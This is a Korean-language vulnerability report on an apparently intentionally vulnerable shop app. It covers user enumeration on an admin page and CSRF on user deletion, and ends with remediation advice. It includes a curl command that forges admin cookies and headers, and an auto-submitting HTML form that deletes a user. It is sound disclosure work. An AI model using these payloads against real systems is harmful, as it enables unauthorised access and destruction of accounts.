# 취약점 보고서: VULN-004

## 취약점 요약
- **취약점 유형**:
  1. 민감한 정보 노출 (Sensitive Information Disclosure)
  2. 사이트 간 요청 위조 (Cross-Site Request Forgery, CSRF)
- **위치**: 관리자 페이지 - 사용자 관리 (`/admin/users`)
- **위험도**: 높음 (High)

## 1. 민감한 정보 노출 (User Enumeration)

### 취약점 설명
VULN-SHOP의 사용자 관리 페이지 (`/admin/users`)는 인증된 관리자에게 시스템에 등록된 모든 사용자의 ID와 사용자명(username)을 노출합니다. 이는 공격자에게 시스템의 모든 사용자 계정 목록을 제공하는 정보 노출 취약점입니다. 공격자는 이 정보를 활용하여 특정 사용자를 대상으로 한 추가 공격(예: 무차별 대입 공격, 소셜 엔지니어링)을 계획할 수 있습니다.

### 재현 단계
1. `VULN-003` (접근 제어 손상) 취약점을 이용하여 관리자 권한을 획득합니다.
2. 관리자 쿠키를 사용하여 `/admin/users` 페이지에 접근합니다.
   ```bash
   curl -s --cookie "user=admin; isAdmin=true; user_id=1" -H "X-Forwarded-For: 10.0.0.103" "http://192.168.0.28:3000/admin/users"
   ```
3. 응답 HTML에 모든 사용자의 ID와 사용자명이 포함된 테이블이 노출되는 것을 확인할 수 있습니다.

## 2. 사이트 간 요청 위조 (CSRF)

### 취약점 설명
사용자 관리 페이지의 '사용자 삭제' 기능에는 CSRF 공격에 대한 방어 메커니즘(예: CSRF 토큰)이 존재하지 않습니다. 이로 인해 공격자는 로그인된 관리자의 세션을 이용하여 특정 사용자를 삭제하는 악성 요청을 위조할 수 있습니다.

예를 들어, 공격자는 자신이 제어하는 웹사이트에 아래와 같은 자동 제출 폼을 포함시킬 수 있습니다. 만약 VULN-SHOP에 관리자로 로그인한 사용자가 이 웹사이트를 방문하면, 자신도 모르는 사이에 ID가 2인 사용자가 삭제됩니다.

```html
<!-- http://attacker-site.com/malicious.html -->
<html>
  <body>
    <p>Loading...</p>
    <form id="csrf-form" action="http://192.168.0.28:3000/admin/users/2/delete" method="POST"></form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

### 재현 단계
1. 관리자 권한으로 VULN-SHOP에 로그인합니다.
2. (시뮬레이션) 위와 같이 조작된 악성 웹페이지를 방문합니다.
3. 사용자의 의도와 상관없이 `/admin/users/2/delete`로 `POST` 요청이 전송되어 ID가 2인 사용자가 삭제됩니다.

## 잠재적 영향
- **정보 유출**: 공격자가 시스템의 모든 사용자 이름을 획득할 수 있습니다.
- **계정 파괴**: 공격자는 CSRF 공격을 통해 관리자 권한으로 시스템의 모든 일반 사용자 계정을 삭제하여 서비스를 대규모로 중단시킬 수 있습니다.
- **서비스 가용성 훼손**: 대량의 사용자 계정이 삭제될 경우, 서비스의 신뢰도와 가용성이 심각하게 훼손됩니다.

## 권고 사항
- **정보 노출 최소화**: 관리자 페이지라 할지라도, 꼭 필요한 정보만 표시해야 합니다. 페이징(pagination)을 적용하고, 사용자 검색 기능을 통해 특정 사용자만 조회하도록 하여 전체 목록이 한 번에 노출되지 않도록 해야 합니다.
- **CSRF 토큰 적용**: 사용자 상태를 변경하는 모든 요청(특히 `POST`, `DELETE`, `PUT` 요청)에 대해 Anti-CSRF 토큰을 적용해야 합니다. 서버는 각 세션마다 고유하고 예측 불가능한 토큰을 생성하고, 폼과 함께 이 토큰을 전송하도록 요구해야 합니다. 서버 측에서는 요청 수신 시 해당 토큰의 유효성을 검증하여, 위조된 요청을 방지해야 합니다.
- **SameSite 쿠키 속성 사용**: 세션 쿠키에 `SameSite=Strict` 또는 `SameSite=Lax` 속성을 설정하여 다른 출처에서 시작된 요청에 쿠키가 전송되지 않도록 제한함으로써 CSRF 공격의 영향을 줄일 수 있습니다.
